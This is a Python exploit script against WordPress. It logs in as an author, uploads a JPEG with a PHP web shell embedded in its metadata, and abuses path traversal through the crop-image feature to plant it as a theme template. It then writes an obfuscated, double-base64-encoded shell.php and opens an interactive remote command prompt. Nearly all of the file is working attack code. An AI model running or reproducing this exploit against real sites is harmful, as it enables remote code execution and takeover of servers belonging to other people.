import requests
import re
from bs4 import BeautifulSoup

server_addr =       'http://192.168.13.10/wordpress/'
url_login =         'wp-login.php'
url_wpnonce =       'wp-admin/media-new.php'
url_upload =        'wp-admin/async-upload.php'
url_edit_attach =   'wp-admin/post.php?post=PID&action=edit'
url_edit_post =     'wp-admin/post.php'
url_crop =          'wp-admin/admin-ajax.php'
url_create_post =   'wp-admin/post-new.php'

cmd = '<?=`$_GET[0]`;?>'
post_id = 0
wp_attached_file = ''

# Step 0 : Login
session = requests.session()
logs = {"log" : "author", "pwd" : "toor", "wp-submit" : "Log In"}
x = session.post(server_addr + url_login, logs)


# Step 1 : Get the wpnonce
x = session.get(server_addr + url_wpnonce)
soup = BeautifulSoup(x.text, 'html.parser')

try:
    wpnonce = soup.find(id="_wpnonce")['value']
except:
    print("[-] Couldn't get the wpnonce, exiting...")
    exit()

print("[+] Got the wpnonce : " + wpnonce)

# Step 2 : Build the payload
cmdlen = len(cmd)
payload = '\xff\xd8\xff\xed\x004Photoshop 3.0\x008BIM\x04\x04'+'\x00'*5+'\x17\x1c\x02\x05\x00\x07PAYLOAD\x00\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00\xff\xdb\x00C\x00\x06\x04\x05\x06\x05\x04\x06\x06\x05\x06\x07\x07\x06\x08\x0a\x10\x0a\x0a\x09\x09\x0a\x14\x0e\x0f\x0c\x10\x17\x14\x18\x18\x17\x14\x16\x16\x1a\x1d%\x1f\x1a\x1b#\x1c\x16\x16 , #&\x27)*)\x19\x1f-0-(0%()(\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x14\x00\x01'+'\x00'*15+'\x08\xff\xc4\x00\x14\x10\x01'+'\x00'*16+'\xff\xda\x00\x08\x01\x01\x00\x00?\x00T\xbf\xff\xd9'
img = payload.replace('\x07PAYLOAD', chr(cmdlen) + cmd)
image_ord = []
for i in range(len(img)):
    image_ord.append(ord(img[i]))
byteArray = bytearray(image_ord)

image = open('shell.jpg', 'w+b')
image.write(byteArray)
image.close()

# Step 3 : Upload the crafted image
try:
    with open('shell.jpg', 'rb') as f:
        upload_data = {
            "name" : "shell.jpg", 
            "post_id" : post_id, 
            "_wpnonce" : wpnonce
        }
        files = {
            "async-upload" : f
        }

        r = session.post(server_addr + url_upload, data=upload_data, files=files)
        post_id = int(r.text)
except:
    print("[-] Couldn't upload image, exiting...")
    exit()

print("[+] Got the post_id : " + str(post_id))


# Step 4 : Replace _wp_attached_file
url_edit_attach = url_edit_attach.replace('PID', str(post_id))

# Step 4.1 : Get wpnonce, ajaxnonce and image url
x = session.get(server_addr + url_edit_attach)
soup = BeautifulSoup(x.text, 'html.parser')

try:
    wpnonce = soup.find(id="_wpnonce")['value']
    ajaxnonce = soup.find(id="imgedit-open-btn-" + str(post_id))['onclick']
    ajaxnonce = re.findall('[a-f0-9]{10}', ajaxnonce)[0]
    url_img = soup.find(id="attachment_url")['value']
except:
    print("[-] Couldn't get the wpnonce, exiting...")
    exit()

print("[+] Got the wpnonce : " + wpnonce + ", the ajaxnonce : " + ajaxnonce
 + " and the image url : " + url_img)

# Step 4.2 : Update _wp_attached_file
wp_attached_file = re.findall('uploads/(.*)', url_img)[0] + "?/any"

upload_data = {
    "action" : "editpost", 
    "post_ID" : post_id, 
    "_wpnonce" : wpnonce,
    'meta_input[_wp_attached_file]': wp_attached_file
}

r = session.post(server_addr + url_edit_post, data=upload_data)
if not r.status_code == 200:
    print("[-] Couldn't update _wp_attached_file meta key to: " + wp_attached_file + ", exiting...")
print("[+] Updated _wp_attached_file meta key to: " + wp_attached_file)

# Step 5 : Crop the image to create help folder
upload_data = {
    '_ajax_nonce': ajaxnonce,
    'action': 'crop-image',
    'id': post_id,
    'cropDetails[width]': 1,
    'cropDetails[height]': 1
}

r = session.post(server_addr + url_crop, data=upload_data)
if not r.status_code == 200:
    print("[-] Couldn't crop image to create help folder, exiting...")
print("[+] Cropped image to create help folder")


# Step 6 : Update _wp_attached_file
wp_attached_file = re.findall('uploads/(.*)', url_img)[0] + "?/../../../../themes/twentynineteen/dummy"

upload_data = {
    "action" : "editpost", 
    "post_ID" : post_id, 
    "_wpnonce" : wpnonce,
    'meta_input[_wp_attached_file]': wp_attached_file
}

r = session.post(server_addr + url_edit_post, data=upload_data)
if not r.status_code == 200:
    print("[-] Couldn't update _wp_attached_file meta key to: " + wp_attached_file)
print("[+] Updated _wp_attached_file meta key to: " + wp_attached_file)

# Step 7 : Crop image to create dummy image inside twentynineteen theme 
upload_data = {
    '_ajax_nonce': ajaxnonce,
    'action': 'crop-image',
    'id': post_id,
    'cropDetails[width]' : 1,
    'cropDetails[height]' : 1
}

r = session.post(server_addr + url_crop, upload_data)
if not r.status_code == 200:
    print("[-] Couldn't crop image to create dummy image inside twentynineteen theme folder, exiting")
print("[+] Cropped image to create dummy image inside twentynineteen theme folder")

# Step 8 : Create new post using dummy image as template

# Step 8.1 : Create a post and get post_id and wpnonce
x = session.get(server_addr + url_create_post)
soup = BeautifulSoup(x.text, 'html.parser')
wpnonce = soup.find(id="_wpnonce")['value']
post_id = soup.find(id="post_ID")['value']

# Step 8.2 :  Edit post to use dummy image
upload_data = {
    '_wpnonce': wpnonce,
    'action': 'editpost',
    'post_ID': post_id,
    'post_title': 'p0wned',
    'visibility': 'public',
    'publish': 'Publish',
    'meta_input[_wp_page_template]': 'cropped-dummy.jpg'
}

r = session.post(server_addr + url_edit_post, upload_data)
if not r.status_code == 200:
    print("[-] Couldn't create post with dummy image")
print("[+] The operation is a success, see " + server_addr + "?p=" + post_id + "&0=your_command_here")


# Getting better way to print commands
x = session.get(server_addr + "?p=" + post_id + "&0=echo UEQ5d2FIQWdjR0Z6YzNSb2NuVW9KRjlIUlZSYk1GMHBPejgr|base64 -d|base64 -d > shell.php")
if not x.status_code == 200:
    print("[-] Failed to create parser")
print("[+] Parser created, visit " + server_addr + "shell.php?0=your_command_here")

print("[+] Here is the sauce for ordered : ")

command = ''
user = session.get(server_addr + "shell.php?0=whoami").text.rstrip()


while not command=='exit' :
    print(session.get(server_addr + "shell.php?0=" + command).text.rstrip())
    command = input(user + '> ')
    

